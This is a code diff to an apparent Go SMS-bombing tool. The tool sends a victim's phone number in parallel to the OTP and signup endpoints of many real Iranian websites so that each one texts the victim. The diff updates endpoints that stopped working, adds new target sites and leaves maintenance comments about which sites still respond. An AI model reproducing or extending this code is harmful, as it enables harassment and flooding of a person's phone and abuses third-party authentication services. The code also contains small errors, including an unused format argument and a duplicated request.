@@ -130,35 +130,42 @@ func main() {
 		go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
 			s57: phone,
 		}, ch) // verify site: i'm not robot
-		go sms(fmt.Sprintf("https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=%s", phone), map[string]interface{}{
-			"monsmain": "monsmain",
-		}, ch)
+		go sms(fmt.Sprintf("https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", phone), map[string]interface{}{
+			"phoneNumber": phone,
+		}, ch) // edit :4/22/2025
 		go sms("https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
+		}, ch)  // delete site: no Access
 		go sms("https://agent.wide-app.ir/auth/token", map[string]interface{}{
 			"'grant_type': 'otp', 'client_id': '62b30c4af53e3b0cf100a4a0', 'phone'": phone,
-		}, ch)
+		}, ch) // error site: secure connection
 		sm := fmt.Sprintf("'credential': {'phoneNumber': %s, 'role': 'PASSENGER'}", phone)
 		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
-			sm: phone,
-		}, ch)
-		go sms("https://web.emtiyaz.app/json/login", map[string]interface{}{
-			"send=1&cellphone=": phone,
-		}, ch)
+			"phoneNumber": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://api.zarinplus.com/user/otp/", map[string]interface{}{
+			"phoneNumber": phone,
+		}, ch)  // edit & Alternative :4/22/2025
 		go sms("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
 			"phone": phone,
-		}, ch)
+		}, ch)  // just check
 		se := fmt.Sprintf("'api_version': '3', 'method': 'sendCode', 'data': {'phone_number': %s, 'send_type': 'SMS'}", phone)
 		go sms("https://messengerg2c4.iranlms.ir/", map[string]interface{}{
 			se: phone,
-		}, ch)
-		go sms("https://nx.classino.com/otp/v1/api/login", map[string]interface{}{
+		}, ch)  // idon't know ???
+		go sms("https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
+		}, ch) // edit :4/22/2025
+		go sms("https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // add site
+ 		go sms("https://lms.tamland.ir/api/api/user/signup", map[string]interface{}{
+			"mobile": phone,
+		}, ch)    // add site
+ /////////////////////////////////////// site aparat should definitely be added.
 		go sms("https://bama.ir/signin-checkforcellnumber", map[string]interface{}{
 			"cellNumber=": phone,
-		}, ch)
+		}, ch) 
 		go sms("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa", map[string]interface{}{
 			"cellphone": phone,
 		}, ch)
